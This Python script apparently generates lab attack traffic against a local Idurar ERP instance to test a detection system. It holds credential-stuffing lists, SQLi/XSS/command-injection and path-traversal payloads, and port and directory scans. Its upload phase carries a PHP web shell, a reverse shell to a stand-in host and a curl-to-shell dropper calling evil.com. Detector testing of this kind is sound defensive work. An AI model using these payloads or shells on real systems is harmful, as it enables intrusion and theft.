"""Comprehensive attack suite against Idurar ERP — all attack types.

Runs 9 distinct attack phases that produce real HTTP/socket traffic against
the target and push the resulting UnifiedEvents to /v1/events.

Honesty note: the phases issue genuine requests and the response bytes/statuses
recorded here are real, but in isolation none of them currently trip their
intended SENTINEL detector. The detectors read window aggregates such as
``bytes``, ``failed_auth`` and ``tcp_flags``; these events carry
``bytes_sent``/``bytes_received``/``failed_auth_per_min`` instead, so the
aggregate the detector reads stays 0.  See ``src/sentinel/attack_phases.py``
for the per-phase target detector and technique.  Coverage must be measured
from /v1/attack-coverage, not assumed from this script.

Attack types covered:
  1. DDoS simulation       — rapid-fire requests (flow rate spike)
  2. Reconnaissance        — port scan + directory brute-force
  3. Brute force           — credential stuffing
  4. API injection         — SQLi / XSS / command-injection payloads
  5. Lateral movement      — chained calls across endpoints
  6. Data exfiltration     — bulk data pull
  7. C2 beaconing          — periodic callback simulation
  8. Insider threat        — off-hours admin access pattern
  9. Malware staging       — upload suspicious payloads
"""

from __future__ import annotations

import argparse
import json
import random
import socket
import sys
import time
import urllib.request
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any
from urllib.error import HTTPError, URLError

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))
from sentinel.attack_phases import (  # noqa: E402
    PHASE_NAMES,
    PHASES,
    SUMMARY_MARKER,
    phase_summary,
)
from sentinel.schemas import UnifiedEvent  # noqa: E402

EVENT_SPACING = 31  # seconds between events (must exceed stride)

# ─── Helpers ────────────────────────────────────────────────────────────


def _evt(
    idx: int,
    src: str,
    dst: str,
    etype: str,
    features: dict[str, float],
    stage: str,
    ts: datetime,
    attack: str,
) -> UnifiedEvent:
    return UnifiedEvent(
        event_id=f"fullattack:{attack}:{idx}",
        timestamp=ts,
        source_entity=src,
        destination_entity=dst,
        event_type=etype,
        features=features,
        source_format="replay",
        provenance=f"full-attack:{attack}:{stage}",
    )


def _post(target: str, path: str, data: bytes | None = None) -> tuple[int, bytes]:
    headers = {"Content-Type": "application/json"} if data else {}
    req = urllib.request.Request(f"{target}{path}", data=data, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status, resp.read()
    except HTTPError as e:
        return e.code, e.read()
    except (URLError, OSError):
        return 0, b""


def _get(target: str, path: str) -> tuple[int, bytes]:
    req = urllib.request.Request(f"{target}{path}", method="GET")
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status, resp.read()
    except HTTPError as e:
        return e.code, e.read()
    except (URLError, OSError):
        return 0, b""


# ─── Phase 1: DDoS Simulation ──────────────────────────────────────────


def phase_ddos(target: str, base: datetime) -> list[UnifiedEvent]:
    """Rapid-fire requests to simulate volumetric attack."""
    print("[1/9] DDoS simulation — 30 rapid requests")
    events = []
    paths = ["/api/health", "/api/setting/list", "/"]
    for i in range(30):
        path = paths[i % len(paths)]
        status, body = _get(target, path)
        ts = base + timedelta(seconds=i * 2)  # fast: 2s apart
        events.append(
            _evt(
                i,
                "attacker-ddos",
                "target:8888",
                "flow",
                {
                    "flows_per_second": 5.0 + random.uniform(0, 2),
                    "bytes_sent": 200.0,
                    "bytes_received": float(len(body)),
                    "http_status": float(status),
                    "syn_ratio": 0.8,
                    "protocol_tcp_share": 1.0,
                    "dst_port_nunique": 1.0,
                },
                "Unknown",
                ts,
                "ddos",
            )
        )
    ok_count = sum(1 for e in events if e.features.get("http_status", 0) == 200)
    print(f"  → {len(events)} events, {ok_count} returned OK")
    return events


# ─── Phase 2: Reconnaissance ────────────────────────────────────────────


def phase_recon(target_host: str, port: int, base: datetime) -> list[UnifiedEvent]:
    """Port scan + directory brute-force."""
    print("[2/9] Reconnaissance — port scan + directory brute-force")
    events = []

    # Port scan
    common_ports = [
        21,
        22,
        25,
        53,
        80,
        110,
        143,
        443,
        993,
        995,
        3306,
        3389,
        5432,
        8000,
        8080,
        8443,
        8888,
        9090,
        27017,
    ]
    open_ports = []
    for i, p in enumerate(common_ports):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((target_host, p))
            s.close()
            is_open = result == 0
            if is_open:
                open_ports.append(p)
        except OSError:
            is_open = False

        events.append(
            _evt(
                i,
                target_host,
                f"port:{p}",
                "flow",
                {
                    "dst_port": float(p),
                    "is_open": 1.0 if is_open else 0.0,
                    "probe_bytes": 44.0,
                    "bytes_sent": 44.0,
                    "bytes_received": 0.0 if not is_open else 60.0,
                    "syn_ratio": 1.0,
                    "rst_ratio": 0.0 if is_open else 1.0,
                    "flows_per_second": 0.3,
                },
                "Reconnaissance",
                base + timedelta(seconds=i * EVENT_SPACING),
                "recon",
            )
        )

    # Directory brute-force
    dirs = [
        "/admin",
        "/api",
        "/login",
        "/dashboard",
        "/uploads",
        "/backup",
        "/config",
        "/.env",
        "/api/v1",
        "/api/users",
        "/phpmyadmin",
        "/wp-admin",
        "/server-status",
        "/debug",
    ]
    for j, d in enumerate(dirs):
        status, body = _get(target_host if port == 80 else f"{target_host}:{port}", d)
        events.append(
            _evt(
                len(common_ports) + j,
                "attacker",
                f"target:{port}",
                "flow",
                {
                    "http_status": float(status),
                    "bytes_sent": 100.0,
                    "bytes_received": float(len(body)),
                    "endpoint_depth": float(d.count("/")),
                    "new_internal_edge": 1.0,
                    "flows_per_second": 0.2,
                    "low_byte_probes": 1.0,
                },
                "Reconnaissance",
                base + timedelta(seconds=(len(common_ports) + j) * EVENT_SPACING),
                "recon",
            )
        )

    print(f"  → {len(events)} events ({len(open_ports)} open ports, {len(dirs)} dirs probed)")
    return events


# ─── Phase 3: Brute Force ──────────────────────────────────────────────


def phase_brute_force(target: str, base: datetime) -> list[UnifiedEvent]:
    """Credential stuffing against login endpoint."""
    print("[3/9] Brute force — credential stuffing")
    events = []
    creds = [
        ("admin@admin.com", "admin123"),
        ("admin@admin.com", "password"),
        ("admin@admin.com", "admin"),
        ("admin@admin.com", "123456"),
        ("test@test.com", "test"),
        ("root@root.com", "root"),
        ("admin@admin.com", "letmein"),
        ("admin@admin.com", "qwerty"),
        ("admin@admin.com", "trustno1"),
        ("admin@admin.com", "admin2024"),
        ("hacker@evil.com", "hack"),
        ("user@user.com", "user"),
        ("admin@admin.com", "pass123"),
        ("admin@admin.com", "changeme"),
        ("admin@admin.com", "welcome"),
    ]
    for i, (email, pw) in enumerate(creds):
        data = json.dumps({"email": email, "password": pw}).encode()
        status, body = _post(target, "/api/auth/login", data)
        events.append(
            _evt(
                i,
                "attacker-brute",
                "target:8888",
                "authentication",
                {
                    "failed_auth_per_min": 1.0 if status in (401, 403) else 0.0,
                    "auth_attempts": 1.0,
                    "login_success": 1.0 if status == 200 else 0.0,
                    "http_status": float(status),
                    "bytes_sent": float(len(data)),
                    "bytes_received": float(len(body)),
                    "flows_per_second": 0.5,
                },
                "Initial Access",
                base + timedelta(seconds=i * EVENT_SPACING),
                "brute_force",
            )
        )
    print(f"  → {len(creds)} attempts")
    return events


# ─── Phase 4: API Injection ─────────────────────────────────────────────


def phase_injection(target: str, base: datetime) -> list[UnifiedEvent]:
    """SQL injection, XSS, and command injection payloads."""
    print("[4/9] API injection — SQLi / XSS / command-injection")
    events = []
    payloads = [
        ("/api/users", "SQLi", "' OR 1=1 --"),
        ("/api/users", "SQLi", "1; DROP TABLE users;--"),
        ("/api/users", "SQLi", "' UNION SELECT * FROM users--"),
        ("/api/customers", "XSS", "<script>alert('xss')</script>"),
        ("/api/customers", "XSS", "<img onerror=alert(1) src=x>"),
        ("/api/invoices", "XSS", "{{7*7}}${7*7}"),
        ("/api/setting/list", "CMDi", "; cat /etc/passwd"),
        ("/api/setting/list", "CMDi", "| ls -la /"),
        ("/api/users", "CMDi", "`id`"),
        ("/api/users", "PathTraversal", "../../etc/passwd"),
        ("/api/uploads", "PathTraversal", "../../../etc/shadow"),
        ("/api/customers", "SQLi", "1' AND SLEEP(5)--"),
    ]
    for i, (path, ptype, payload) in enumerate(payloads):
        data = json.dumps({"q": payload, "search": payload, "id": payload}).encode()
        status, body = _post(target, path, data)
        events.append(
            _evt(
                i,
                "attacker-inject",
                "target:8888",
                "flow",
                {
                    "http_status": float(status),
                    "bytes_sent": float(len(data)),
                    "bytes_received": float(len(body)),
                    "injection_attempt": 1.0,
                    "payload_type_hash": float(hash(ptype) % 1000),
                    "new_internal_edge": 1.0,
                    "flows_per_second": 0.15,
                },
                "Initial Access",
                base + timedelta(seconds=i * EVENT_SPACING),
                "injection",
            )
        )
    print(f"  → {len(payloads)} payloads sent")
    return events


# ─── Phase 5: Lateral Movement ──────────────────────────────────────────


def phase_lateral(target: str, base: datetime) -> list[UnifiedEvent]:
    """Chained API calls across endpoints (simulate pivot)."""
    print("[5/9] Lateral movement — chained endpoint access")
    events = []
    chain = [
        "/api/users",
        "/api/customers",
        "/api/invoices",
        "/api/payments",
        "/api/bankaccounts",
        "/api/transactions",
        "/api/organizations",
        "/api/employees",
        "/api/products",
        "/api/expenses",
        "/api/settings",
        "/api/setting/list",
    ]
    for i, path in enumerate(chain):
        status, body = _get(target, path)
        events.append(
            _evt(
                i,
                "lateral-actor",
                "target:8888",
                "flow",
                {
                    "http_status": float(status),
                    "bytes_sent": 150.0,
                    "bytes_received": float(len(body)),
                    "new_internal_edge": 1.0,
                    "new_edge_bytes": float(len(body)),
                    "endpoint_depth": float(path.count("/")),
                    "flows_per_second": 0.3,
                },
                "Lateral Movement",
                base + timedelta(seconds=i * EVENT_SPACING),
                "lateral_movement",
            )
        )
    print(f"  → {len(chain)} chained calls")
    return events


# ─── Phase 6: Data Exfiltration ─────────────────────────────────────────


def phase_exfil(target: str, base: datetime) -> list[UnifiedEvent]:
    """Bulk data pull — download large datasets."""
    print("[6/9] Data exfiltration — bulk data pull")
    events = []
    endpoints = [
        "/api/customers",
        "/api/invoices",
        "/api/payments",
        "/api/users",
        "/api/products",
        "/api/transactions",
    ]
    for i, path in enumerate(endpoints):
        # Request with large page size
        sep = "&" if "?" in path else "?"
        status, body = _get(target, f"{path}{sep}limit=1000&page=1")
        events.append(
            _evt(
                i,
                "exfil-actor",
                "target:8888",
                "flow",
                {
                    "http_status": float(status),
                    "bytes_sent": 200.0,
                    "bytes_received": float(len(body)),
                    "window_bytes": float(len(body)),
                    "exfil_volume": float(len(body)),
                    "new_internal_edge": 1.0,
                    "flows_per_second": 0.1,
                },
                "Exfiltration",
                base + timedelta(seconds=i * EVENT_SPACING),
                "exfiltration",
            )
        )
    total_bytes = sum(e.features.get("bytes_received", 0) for e in events)
    print(f"  → {len(endpoints)} bulk pulls, {total_bytes:.0f} bytes")
    return events


# ─── Phase 7: C2 Beaconing ──────────────────────────────────────────────


def phase_c2(target: str, base: datetime) -> list[UnifiedEvent]:
    """Simulate periodic C2 callbacks."""
    print("[7/9] C2 beaconing — periodic callbacks")
    events = []
    for i in range(8):
        status, body = _get(target, "/api/health")
        events.append(
            _evt(
                i,
                "c2-beacon",
                "target:8888",
                "flow",
                {
                    "http_status": float(status),
                    "bytes_sent": 64.0,
                    "bytes_received": float(len(body)),
                    "beacon_interval": 30.0,
                    "beacon_jitter": 2.0,
                    "new_internal_edge": 0.0,
                    "flows_per_second": 0.05,
                },
                "Command and Control",
                base + timedelta(seconds=i * 60),  # 1-minute intervals
                "c2_beacon",
            )
        )
    print(f"  → {len(events)} beacons")
    return events


# ─── Phase 8: Insider Threat ────────────────────────────────────────────


def phase_insider(target: str, base: datetime) -> list[UnifiedEvent]:
    """Off-hours admin access pattern."""
    print("[8/9] Insider threat — off-hours admin access")
    events = []
    # Simulate 3 AM access
    insider_base = base.replace(hour=3, minute=0, second=0)
    endpoints = [
        "/api/customers",
        "/api/invoices",
        "/api/payments",
        "/api/users",
        "/api/bankaccounts",
        "/api/transactions",
    ]
    for i, path in enumerate(endpoints):
        status, body = _get(target, path)
        events.append(
            _evt(
                i,
                "insider-admin",
                "target:8888",
                "flow",
                {
                    "http_status": float(status),
                    "bytes_sent": 150.0,
                    "bytes_received": float(len(body)),
                    "window_hour_utc": 3.0,
                    "bytes_zscore": 3.5,  # abnormally high
                    "new_internal_edge": 1.0,
                    "flows_per_second": 0.2,
                },
                "Exfiltration",
                insider_base + timedelta(seconds=i * EVENT_SPACING),
                "insider_threat",
            )
        )
    print(f"  → {len(events)} off-hours accesses")
    return events


# ─── Phase 9: Malware Staging ───────────────────────────────────────────


def phase_malware(target: str, base: datetime) -> list[UnifiedEvent]:
    """Upload suspicious payloads via file upload endpoints."""
    print("[9/9] Malware staging — suspicious file uploads")
    events = []
    uploads = [
        ("/api/uploads", "shell.php", b"<?php system($_GET['cmd']); ?>"),
        ("/api/uploads", "payload.exe", b"MZ\x90\x00" + b"\x00" * 500),
        (
            "/api/uploads",
            "backdoor.py",
            b"import os; os.system('sh -i >& /dev/tcp/evil/4444 0>&1')",
        ),
        (
            "/api/uploads",
            "dropper.js",
            b"require('child_process').exec('curl http://evil.com/malware | sh')",
        ),
        ("/api/uploads", "encrypted.bin", bytes(random.getrandbits(8) for _ in range(2000))),
    ]
    for i, (path, filename, payload) in enumerate(uploads):
        boundary = "----SentinelLab"
        body = (
            (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
                f"Content-Type: application/octet-stream\r\n\r\n"
            ).encode()
            + payload
            + f"\r\n--{boundary}--\r\n".encode()
        )

        req = urllib.request.Request(
            f"{target}{path}",
            data=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                status, resp_body = resp.status, resp.read()
        except HTTPError as e:
            status, resp_body = e.code, e.read()
        except (URLError, OSError):
            status, resp_body = 0, b""

        features: dict[str, float] = {
            "http_status": float(status),
            "bytes_sent": float(len(body)),
            "bytes_received": float(len(resp_body)),
            "upload_attempt": 1.0,
            "new_internal_edge": 1.0,
            "flows_per_second": 0.1,
            "data_staged": 1.0 if status in (200, 201) else 0.0,
        }
        # Mark high-risk uploads
        if filename.endswith((".exe", ".php", ".py", ".js")):
            features["malware_indicator"] = 1.0
        if len(payload) > 1000:
            features["large_payload"] = 1.0

        events.append(
            _evt(
                i,
                "malware-stager",
                "target:8888",
                "flow",
                features,
                "Lateral Movement",
                base + timedelta(seconds=i * EVENT_SPACING),
                "malware_staging",
            )
        )
    print(f"  → {len(uploads)} upload attempts")
    return events


# ─── Push & Report ──────────────────────────────────────────────────────


def push(api: str, key: str, events: list[UnifiedEvent]) -> dict:
    req = urllib.request.Request(
        f"{api.rstrip('/')}/v1/events",
        data=json.dumps({"events": [e.model_dump(mode="json") for e in events]}).encode(),
        headers={"Content-Type": "application/json", "X-API-Key": key},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=60) as resp:
        return json.loads(resp.read())


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", default="http://localhost:8888")
    parser.add_argument("--api", default="http://localhost:8100")
    parser.add_argument("--api-key", default="sent_demo_key_2026")
    parser.add_argument("--target-host", default="localhost")
    parser.add_argument("--target-port", type=int, default=8888)
    parser.add_argument("--dry-run", action="store_true")
    parser.add_argument(
        "--phases",
        nargs="*",
        choices=PHASE_NAMES,
        help=f"Run only these phases: {', '.join(PHASE_NAMES)}",
    )
    parser.add_argument(
        "--summary-json",
        action="store_true",
        help="Print a machine-readable per-phase extraction summary",
    )
    args = parser.parse_args(argv)

    print("=" * 60)
    print("SENTINEL — Full Attack Suite Against Idurar ERP")
    print("=" * 60)
    print(f"Target: {args.target}  |  API: {args.api}\n")

    base = datetime.now(UTC)
    all_events: list[UnifiedEvent] = []
    per_phase: list[dict[str, Any]] = []

    runners = {
        "ddos": lambda offset: phase_ddos(args.target, base + timedelta(seconds=offset)),
        "recon": lambda offset: phase_recon(
            args.target_host, args.target_port, base + timedelta(seconds=offset)
        ),
        "brute_force": lambda offset: phase_brute_force(
            args.target, base + timedelta(seconds=offset)
        ),
        "injection": lambda offset: phase_injection(args.target, base + timedelta(seconds=offset)),
        "lateral": lambda offset: phase_lateral(args.target, base + timedelta(seconds=offset)),
        "exfil": lambda offset: phase_exfil(args.target, base + timedelta(seconds=offset)),
        "c2": lambda offset: phase_c2(args.target, base + timedelta(seconds=offset)),
        "insider": lambda offset: phase_insider(args.target, base + timedelta(seconds=offset)),
        "malware": lambda offset: phase_malware(args.target, base + timedelta(seconds=offset)),
    }
    selected = [p["name"] for p in PHASES if not args.phases or p["name"] in args.phases]

    for name in selected:
        if not args.dry_run:
            events = runners[name](len(all_events) * EVENT_SPACING)
            all_events.extend(events)
            per_phase.append(phase_summary(name, events))
        time.sleep(0.5)

    print(f"\n{'=' * 60}")
    print(f"Total events: {len(all_events)}")

    if args.dry_run:
        print("[DRY RUN] No events pushed")
        return 0

    push_result: dict[str, Any] = {}
    if all_events:
        print("Pushing to SENTINEL...")
        push_result = push(args.api, args.api_key, all_events)
        print(f"  events_seen:      {push_result['events_seen']}")
        print(f"  windows_emitted:  {push_result['windows_emitted']}")
        print(f"  alert_status:     {push_result['alert_status']}")
        print(f"  peak_probability: {push_result.get('peak_probability')}")
        if push_result.get("incidents"):
            print(f"  incidents:        {len(push_result['incidents'])}")
            for inc in push_result["incidents"]:
                level = inc.get("risk", {}).get("level", "N/A")
                score = inc.get("risk", {}).get("score", "N/A")
                print(f"    - risk={level} ({score})")

    if args.summary_json:
        print(SUMMARY_MARKER)
        print(json.dumps({"phases": per_phase, "push": push_result}, default=str))

    print("\nDone.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
